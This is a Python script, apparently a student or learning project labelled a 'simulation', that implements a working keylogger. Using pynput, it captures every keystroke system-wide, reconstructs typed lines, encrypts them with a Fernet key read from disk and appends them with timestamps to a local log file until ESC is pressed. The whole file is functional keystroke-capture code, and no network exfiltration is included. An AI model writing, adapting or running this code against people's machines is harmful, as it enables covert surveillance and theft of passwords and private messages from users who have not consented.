from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
import os

base_dir = os.path.dirname(__file__)
log_file = os.path.join(base_dir, "..", "logs", "keylogs.txt")
key_file = os.path.join(base_dir, "..", "secret.key")

buffer = ""

with open(key_file, "rb") as f:
    key = f.read()

cipher = Fernet(key)


def save_log(text):
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"{time} : {text}"

    encrypted = cipher.encrypt(entry.encode())

    with open(log_file, "ab") as f:
        f.write(encrypted + b"\n")


def on_press(key):
    global buffer

    try:
        buffer += key.char

    except AttributeError:

        if key == keyboard.Key.space:
            buffer += " "

        elif key == keyboard.Key.enter:
            save_log(buffer)
            buffer = ""

        elif key == keyboard.Key.backspace:
            buffer = buffer[:-1]


def on_release(key):

    if key == keyboard.Key.esc:
        if buffer != "":
            save_log(buffer)

        print("Keylogger stopped")
        return False


print("Keylogger simulation running...")
print("Press ESC to stop.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
